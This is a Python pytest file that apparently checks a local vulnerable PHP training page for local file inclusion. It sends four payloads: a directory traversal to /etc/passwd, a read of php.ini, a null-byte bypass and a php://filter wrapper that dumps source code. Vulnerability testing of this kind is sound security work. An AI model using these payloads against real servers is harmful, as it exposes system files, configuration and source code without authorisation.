import pytest
import requests

def test_file_inclusion_vulnerability(session):
    """Test if file inclusion vulnerability exists in lvl1.php"""
    
    # Setup
    url = "http://localhost:9991/FileInclusion/pages/lvl1.php"
    
    # Test case 1: Local File Inclusion
    payload = "../../../../etc/passwd"
    response = session.get(url, params={
        'file': payload
    })
    
    # Verify we can read sensitive system files
    # Check if the file inclusion attempt was processed
    assert "Warning" in response.text or \
           "failed to open stream" in response.text or \
           "root:" in response.text or \
           "/bin/bash" in response.text, \
           "File inclusion vulnerability not confirmed - cannot read /etc/passwd"
    
    # Test case 2: Try to include PHP configuration
    php_payload = "../../../../etc/php/php.ini"
    response = session.get(url, params={
        'file': php_payload
    })
    
    # Verify we can read PHP configuration
    assert "[PHP]" in response.text or "allow_url_include" in response.text, \
           "File inclusion vulnerability not confirmed - cannot read php.ini"
    
    # Test case 3: Try directory traversal with null byte injection
    null_payload = "../../../../etc/passwd%00.php"
    response = session.get(url, params={
        'file': null_payload
    })
    
    # Verify null byte bypass works
    assert "root:" in response.text or "/bin/bash" in response.text, \
           "File inclusion vulnerability not confirmed - null byte bypass failed"
    
    # Test case 4: Try PHP wrapper for base64 encoded file inclusion
    wrapper_payload = "php://filter/convert.base64-encode/resource=index.php"
    response = session.get(url, params={
        'file': wrapper_payload
    })
    
    # Verify PHP wrapper works
    assert len(response.text) > 0 and ";" in response.text, \
           "File inclusion vulnerability not confirmed - PHP wrapper failed"
